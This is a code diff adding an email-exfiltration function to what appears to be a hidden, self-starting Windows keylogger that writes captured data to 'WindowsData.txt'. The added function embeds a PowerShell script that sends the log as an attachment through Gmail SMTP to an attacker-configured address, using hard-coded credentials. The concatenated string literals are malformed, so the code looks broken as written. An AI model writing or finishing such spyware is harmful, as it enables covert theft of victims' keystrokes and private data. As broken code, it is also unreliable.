@@ -18,6 +18,50 @@ const char LOGFILENAME[] = {"WindowsData.txt"};
 bool invisible = true;
 bool autostartOnStartup = true;
 
+void sendEmail(void) {
+    // https://stackoverflow.com/questions/53056510/powershell-email-send-from-c-application
+    const std::string &PowerShellScript =
+    "Function Send-EMail {\nParam (\n\t[Parameter(`\n\t\tMandatory=$true)]\n\t[String]$EmailTo,\n\t[Parameter(`\n\t\tMandatory=$true)]\n\t[String]$Subject,
+        [Parameter(`
+            Mandatory=$true)]
+        [String]$Body,
+        [Parameter(`
+            Mandatory=$true)]
+        [String]$EmailFrom="myself@gmail.com",
+        [Parameter(`
+            mandatory=$false)]
+        [String]$attachment,
+        [Parameter(`
+            mandatory=$true)]
+        [String]$Password
+    )
+
+        $SMTPServer = "smtp.gmail.com"
+        $SMTPMessage = New-Object System.Net.Mail.MailMessage($EmailFrom,$EmailTo,$Subject,$Body)
+        if ($attachment -ne $null) {
+            $SMTPattachment = New-Object System.Net.Mail.Attachment($attachment)
+            $SMTPMessage.Attachments.Add($SMTPattachment)
+        }
+        $SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+        $SMTPClient.EnableSsl = $true
+        $SMTPClient.Credentials = New-Object System.Net.NetworkCredential($EmailFrom.Split("@")[0], $Password);
+        $SMTPClient.Send($SMTPMessage)
+        Remove-Variable -Name SMTPClient
+        Remove-Variable -Name Password
+    }"
+    "Send-EMail -attachment $Att "
+    "-To \"" +
+     std::string (X_EM_TO) +
+     "\""
+    " -Body $Body -Subject $Subj "
+    "-password \"" +
+     std::string (X_EM_PASS) +
+      "\""
+    " -From \"" +
+     std::string (X_EM_FROM) +
+    "\"""\r\n    }\r\ncatch\r\n    {\r\n        exit 4; \r\n    }";
+}
+
 void restartOnStartup(void) {
     char re[MAX_PATH];
     string progPath = string(re, GetModuleFileName(NULL, re, MAX_PATH));
